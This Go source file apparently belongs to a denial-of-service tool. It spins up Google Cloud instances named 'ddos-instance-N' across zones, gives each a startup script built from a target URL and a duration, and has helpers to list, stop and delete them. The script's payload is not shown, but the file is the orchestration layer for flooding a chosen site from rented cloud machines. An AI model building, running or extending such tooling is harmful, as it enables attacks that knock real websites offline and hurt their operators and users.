package lib

import (
	"context"
	"fmt"
	"regexp"
	"sync"

	compute "cloud.google.com/go/compute/apiv1"
	"google.golang.org/api/iterator"
	"google.golang.org/api/option"
	computepb "google.golang.org/genproto/googleapis/cloud/compute/v1"
	"google.golang.org/protobuf/proto"
)

const MAX_INSTANCES int = 20

func CreateInstances(params IntputParams) {
	zones := getZonesList()
	var wg sync.WaitGroup

	for i, zone := range zones {
		instaceName := fmt.Sprintf("ddos-instance-%v", i+1)
		wg.Add(1)
		go createInstance(&wg, zone, instaceName, params)
	}
	wg.Wait()
}

func createInstance(wg *sync.WaitGroup, zone, instanceName string, params IntputParams) {
	machineType := "e2-small"
	sourceImage := "projects/debian-cloud/global/images/family/debian-10"
	startUpScript := getStartUpSript(params.Url, params.Duration)

	ctx := context.Background()
	instancesClient, err := compute.NewInstancesRESTClient(
		ctx,
		option.WithCredentialsFile(params.ApiKeyPath),
	)
	if err != nil {
		fmt.Printf("NewInstancesRESTClient: %v\n", err)
	}

	req := &computepb.InsertInstanceRequest{
		Project: params.ProjectID,
		Zone:    zone,
		InstanceResource: &computepb.Instance{
			Name: proto.String(instanceName),
			Disks: []*computepb.AttachedDisk{
				{
					InitializeParams: &computepb.AttachedDiskInitializeParams{
						DiskSizeGb:  proto.Int64(10),
						SourceImage: proto.String(sourceImage),
					},
					AutoDelete: proto.Bool(true),
					Boot:       proto.Bool(true),
					Type:       proto.String(computepb.AttachedDisk_PERSISTENT.String()),
					Mode:       proto.String(computepb.AttachedDisk_READ_WRITE.String()),
				},
			},
			MachineType: proto.String(fmt.Sprintf("zones/%s/machineTypes/%s", zone, machineType)),
			NetworkInterfaces: []*computepb.NetworkInterface{
				{
					AccessConfigs: []*computepb.AccessConfig{
						{
							NetworkTier: proto.String(computepb.AccessConfig_PREMIUM.String()),
						},
					},
					Name: proto.String("global/networks/default"),
				},
			},
			Metadata: &computepb.Metadata{
				Items: []*computepb.Items{
					{
						Key:   proto.String("startup-script"),
						Value: proto.String(startUpScript),
					},
				},
			},
			Tags: &computepb.Tags{
				Items: []string{"http-server", "https-server"},
			},
		},
	}

	fmt.Printf("Creating %v...\n", instanceName)
	op, err := instancesClient.Insert(ctx, req)
	if err != nil {
		fmt.Printf("Error: unable to create %v: %v\n", instanceName, err)
	}

	if err = op.Wait(ctx); err != nil {
		fmt.Printf("Error Instance[%v]: unable to wait for the operation: %v\n", instanceName, err)
	}

	fmt.Printf("Instance[%v] created\n", instanceName)
	instancesClient.Close()
	wg.Done()
}

func DeleteAllInstances(params IntputParams) {
	instances, err := listAllInstances(params.ProjectID, params.ApiKeyPath)
	if err != nil {
		fmt.Println(err)
		return
	}
	var wg sync.WaitGroup
	for _, instance := range instances {
		wg.Add(1)
		go deleteInstance(&wg, extractZoneFromUrl(instance.GetZone()), instance.GetName(), params)
	}
	wg.Wait()
}

func deleteInstance(wg *sync.WaitGroup, zone, instanceName string, params IntputParams) {
	ctx := context.Background()
	instancesClient, err := compute.NewInstancesRESTClient(
		ctx,
		option.WithCredentialsFile(params.ApiKeyPath),
	)
	if err != nil {
		fmt.Printf("[%v] NewInstancesRESTClient: %v", instanceName, err)
	}
	req := &computepb.DeleteInstanceRequest{
		Project:  params.ProjectID,
		Zone:     zone,
		Instance: instanceName,
	}

	op, err := instancesClient.Delete(ctx, req)
	if err != nil {
		fmt.Printf("[%v] unable to delete instance: %v", instanceName, err)
	}

	if err = op.Wait(ctx); err != nil {
		fmt.Printf("[%v] unable to wait for the operation: %v", instanceName, err)
	}

	fmt.Printf("[%v] Instance deleted\n", instanceName)
	instancesClient.Close()
	wg.Done()
}

func StopAllInstances(params IntputParams) {
	instances, err := listAllInstances(params.ProjectID, params.ApiKeyPath)
	if err != nil {
		fmt.Println(err)
		return
	}
	var wg sync.WaitGroup
	for _, instance := range instances {
		wg.Add(1)
		go stopInstance(&wg, extractZoneFromUrl(instance.GetZone()), instance.GetName(), params)
	}
	wg.Wait()
}

func stopInstance(wg *sync.WaitGroup, zone, instanceName string, params IntputParams) {
	ctx := context.Background()
	instancesClient, err := compute.NewInstancesRESTClient(
		ctx,
		option.WithCredentialsFile(params.ApiKeyPath),
	)
	if err != nil {
		fmt.Printf("NewInstancesRESTClient: %v", err)
	}

	req := &computepb.StopInstanceRequest{
		Project:  params.ProjectID,
		Zone:     zone,
		Instance: instanceName,
	}

	op, err := instancesClient.Stop(ctx, req)
	if err != nil {
		fmt.Printf("[%v] unable to stop instance: %v", instanceName, err)
	}

	if err = op.Wait(ctx); err != nil {
		fmt.Printf("[%v] unable to wait for the operation: %v", instanceName, err)
	}

	fmt.Printf("[%v] Instance stopped\n", instanceName)
	instancesClient.Close()
	wg.Done()
}

func listAllInstances(projectID, ApiKeyPath string) ([]*computepb.Instance, error) {
	resultList := []*computepb.Instance{}

	ctx := context.Background()
	instancesClient, err := compute.NewInstancesRESTClient(
		ctx,
		option.WithCredentialsFile(ApiKeyPath),
	)
	if err != nil {
		fmt.Printf("NewInstancesRESTClient: %v", err)
	}
	defer instancesClient.Close()

	req := &computepb.AggregatedListInstancesRequest{
		Project:    projectID,
		MaxResults: proto.Uint32(uint32(MAX_INSTANCES)),
	}

	r, _ := regexp.Compile(`ddos-instance-\d+`)
	it := instancesClient.AggregatedList(ctx, req)
	for {
		pair, err := it.Next()
		if err == iterator.Done {
			break
		}
		if err != nil {
			return resultList, err
		}
		instances := pair.Value.Instances
		if len(instances) > 0 {
			for _, instance := range instances {
				if r.MatchString(instance.GetName()) {
					resultList = append(resultList, instance)
				}
			}
		}
	}
	return resultList, nil
}
